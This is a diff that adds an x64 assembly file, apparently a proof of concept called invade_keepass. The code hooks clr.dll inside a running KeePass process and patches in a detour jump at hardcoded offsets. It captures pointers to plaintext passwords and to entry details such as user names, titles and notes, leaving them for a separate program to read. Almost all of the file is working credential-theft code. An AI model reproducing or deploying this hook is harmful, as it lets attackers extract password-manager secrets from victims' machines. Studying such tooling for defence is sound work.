@@ -1,0 +1,81 @@
+; invade_keepass shellcode
+
+; invade_keepass is a proof of concept for extracting passwords and other sensitive information from a running KeePass process in Windows.
+
+; Written in Multiline Ultimate Assembler for x64dbg
+
+; Upon success, two pointers are stored in memory for later reading by a separate program.
+; One pointer is for the password.
+; The other pointer is for the non-password info (user name, entry title, notes, etc.).
+; The password is in Unicode format.
+; The non-password info is in ASCII RTF format.
+
+; Important: The "movabs qword ptr" instructions require PAGE_EXECUTE_READWRITE to be applied to the shellcode's memory region.
+; Important: Copying user names (via KeePass's Ctrl+B shortcut, for example) will be considered passwords by the shellcode, so consider that some passwords may actually be be user names.
+; Important: Hardcoded offsets are used (e.g. jmp $clr.70D96C) and would need to be updated to support other versions of clr.dll.
+
+
+; Hook
+; ----
+
+; clr.dll:$70D96C
+<$clr.70D96C>
+
+; Original instruction
+mov byte ptr ss:[rsp+0x60], 0x0
+
+; Check rax pointer validity
+cmp rax, 0x1000
+jl @ret
+
+; rbx == 0x1 is a sign of non-password info
+cmp rbx, 0x1
+je @check_info
+
+; Continue to check if password
+
+@check_password:
+
+; Check rbx pointer validity
+cmp rbx, 0x1000
+jl @ret
+
+cmp rax, rbx
+je @ret
+
+cmp dword ptr [rbx], 0x0
+je @ret
+
+; - - string check (used by KeePass for flushing memory)
+cmp dword ptr [rax], 0x002D002D
+je @ret
+
+; Success (password info)
+@save_pointer_password:
+movabs qword ptr [$clr.70D964], rax
+jmp @ret
+
+; Continue to check if info
+
+@check_info:
+
+; {\rt string check
+cmp dword ptr [rax], 0x74725C7B
+jne @ret
+
+; Success (pointer info)
+@save_pointer_info:
+movabs qword ptr [$clr.70D95C], rax
+
+; Return to clr.dll
+@ret:
+jmp $clr.A7E70
+
+
+; Detour
+; ------
+
+; clr.dll:$A7E6B
+<$clr.A7E6B>
+; Conveniently, this jmp to Hook takes up 5 bytes - the same as original instruction (C6 44 24 60 00)
+jmp $clr.70D96C
